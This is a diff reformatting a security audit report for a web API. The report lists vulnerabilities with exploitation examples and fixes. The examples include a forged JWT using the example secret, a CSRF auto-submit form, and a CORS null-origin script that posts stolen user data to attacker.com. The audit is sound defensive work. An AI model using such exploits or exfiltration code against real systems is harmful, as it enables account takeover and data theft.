@@ -9,6 +9,7 @@
 ## Executive Summary
 
 This security audit identified **15 vulnerabilities** across 4 severity levels:
+
 - **3 CRITICAL** - Require immediate attention
 - **4 HIGH** - Should be fixed before production
 - **5 MEDIUM** - Improve security posture
@@ -28,6 +29,7 @@ This security audit identified **15 vulnerabilities** across 4 severity levels:
 
 **Issue:**
 The example environment file contains a weak, obvious JWT secret that developers might copy directly to production:
+
 ```bash
 JWT_SECRET=your-super-secret-jwt-key-change-this-in-production
 ```
@@ -35,6 +37,7 @@ JWT_SECRET=your-super-secret-jwt-key-change-this-in-production
 If this weak secret is used in production, attackers can forge JWT tokens and gain unauthorized access to any user account.
 
 **Exploitation:**
+
 ```bash
 # Attacker can sign their own tokens with the weak secret
 const forgedToken = jwt.sign({ userId: 'admin-id', type: 'access' }, 'your-super-secret-jwt-key-change-this-in-production');
@@ -105,22 +108,25 @@ origin: (origin, callback) => {
     return callback(null, true);
   }
   // ...
-}
+};
 ```
 
 This allows attackers to bypass CORS restrictions entirely.
 
 **Exploitation:**
+
 ```html
 <!-- Attacker's file:///malicious.html -->
 <script>
   // No origin header, so CORS allows request
   fetch('https://api.maestro.edu/api/users/me', {
-    credentials: 'include'
-  }).then(r => r.json()).then(data => {
-    // Steal user data
-    fetch('https://attacker.com/steal', { method: 'POST', body: JSON.stringify(data) });
-  });
+    credentials: 'include',
+  })
+    .then((r) => r.json())
+    .then((data) => {
+      // Steal user data
+      fetch('https://attacker.com/steal', { method: 'POST', body: JSON.stringify(data) });
+    });
 </script>
 ```
 
@@ -171,6 +177,7 @@ catch (error) {
 While the response is generic, `console.error(error)` logs the full Prisma error with table/field names to stdout, which could be exposed if logs are not properly secured.
 
 **Exploitation:**
+
 ```bash
 # Attacker triggers errors and examines logs/monitoring
 POST /api/hub/posts
@@ -273,10 +280,11 @@ Then apply in routes:
 The application uses cookies for authentication (`credentials: true` in CORS) but does not implement CSRF protection. This allows attackers to perform state-changing operations on behalf of authenticated users.
 
 **Exploitation:**
+
 ```html
 <!-- Attacker's site -->
 <form action="https://api.maestro.edu/api/hub/posts" method="POST">
-  <input type="hidden" name="content" value="I have been hacked!">
+  <input type="hidden" name="content" value="I have been hacked!" />
 </form>
 <script>
   document.forms[0].submit();
@@ -338,6 +346,7 @@ The application uses cookies for authentication (`credentials: true` in CORS) bu
 ```
 
 Update package.json:
+
 ```bash
 npm install csurf
 ```
@@ -354,6 +363,7 @@ npm install csurf
 User-generated content (posts, comments, bios) is not sanitized for XSS. While React escapes by default, API consumers or admin panels could be vulnerable.
 
 **Exploitation:**
+
 ```javascript
 POST /api/hub/posts
 {
@@ -538,6 +548,7 @@ const skip = (page - 1) * limit;
 ```
 
 An attacker could request millions of records:
+
 ```
 GET /api/hub/posts?limit=999999999
 ```
@@ -797,6 +808,7 @@ Different error messages reveal whether an email/username exists.
 **Recommended Fix:**
 
 Use generic messages for both registration and login failures:
+
 ```javascript
 return res.status(400).json({
   error: 'Registration failed. Please check your information and try again.',
@@ -816,6 +828,7 @@ Rate limiting slows attacks but doesn't lock accounts after repeated failures.
 **Recommended Fix:**
 
 Track failed attempts per account and implement temporary lockout:
+
 ```javascript
 const MAX_FAILED_LOGINS = 10;
 const LOCKOUT_DURATION_MINUTES = 30;
@@ -878,18 +891,21 @@ Some security headers could be added for defense in depth.
 ## Remediation Priority
 
 ### Immediate (Deploy Block):
+
 1. **Critical #1:** JWT Secret Validation
 2. **Critical #2:** CORS Null Origin
 3. **High #4:** CSRF Protection
 4. **High #6:** Rate Limiter Fail-Closed
 
 ### Before Production:
+
 5. **Critical #3:** Error Message Sanitization
 6. **High #5:** XSS Sanitization
 7. **High #7:** Pagination Validation
 8. **Medium #11:** Security Logging
 
 ### Continuous Improvement:
+
 - All Medium and Low severity issues
 - Penetration testing
 - Security monitoring setup
@@ -900,12 +916,14 @@ Some security headers could be added for defense in depth.
 ## Testing Recommendations
 
 1. **Run Static Analysis:**
+
    ```bash
    npm audit
    npm run lint
    ```
 
 2. **Test CSRF Protection:**
+
    ```bash
    # Should fail without token
    curl -X POST http://localhost:3001/api/hub/posts \
@@ -914,6 +932,7 @@ Some security headers could be added for defense in depth.
    ```
 
 3. **Test Rate Limiting:**
+
    ```bash
    # Should block after 5 attempts
    for i in {1..10}; do
@@ -935,6 +954,7 @@ Some security headers could be added for defense in depth.
 ## Compliance Notes
 
 This audit addresses requirements for:
+
 - **OWASP Top 10 2021:** A01 (Broken Access Control), A02 (Cryptographic Failures), A03 (Injection), A05 (Security Misconfiguration), A07 (XSS)
 - **CWE Top 25:** Multiple CWEs addressed
 - **GDPR:** Enhanced security for personal data protection
